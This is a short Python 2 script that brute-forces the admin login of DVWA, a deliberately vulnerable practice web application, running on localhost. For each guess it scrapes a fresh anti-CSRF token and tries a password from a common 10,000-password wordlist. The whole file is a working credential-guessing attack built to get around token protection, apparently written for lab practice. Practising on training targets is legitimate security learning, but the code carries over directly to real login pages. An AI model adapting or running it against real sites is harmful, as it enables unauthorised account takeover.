#The code will extract the CSRF token from a page and initiate bruteforcing using common wordlist
import requests
from bs4 import BeautifulSoup

#Login bruteforcing using python
def brute_me(pwd,csrf_token,cookies):
    url_brute='http://localhost:8181/DVWA-master/vulnerabilities/brute/?username=admin&password='+pwd+'&Login=Login&user_token='+csrf_token
    r=requests.get(url=url_brute,cookies=cookies)
    if "password protected area" in r.text:
        return True

def generate_token():
    with open(r'C:\gitbased\SecLists\Passwords\Common-Credentials\10-million-password-list-top-10000.txt') as fh:
            for line in fh:
                url='http://localhost:8181/DVWA-master/vulnerabilities/brute/index.php'
                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml',
                    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
                    'Host': 'localhost:8181'
                }
                cookies={'security':'high', 'security_level':'1', 'PHPSESSID':'m5qg9v3rjvrihb2sahdcab9a71'}
                r=requests.get(url=url,headers=headers,cookies=cookies)

                page_source = r.text

                soup = BeautifulSoup(page_source, "html.parser")

                csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
                print csrf_token
                s=brute_me(str(line.strip()),csrf_token,cookies)
                if(s):
                    print "password Found" ,line
                    break




generate_token()
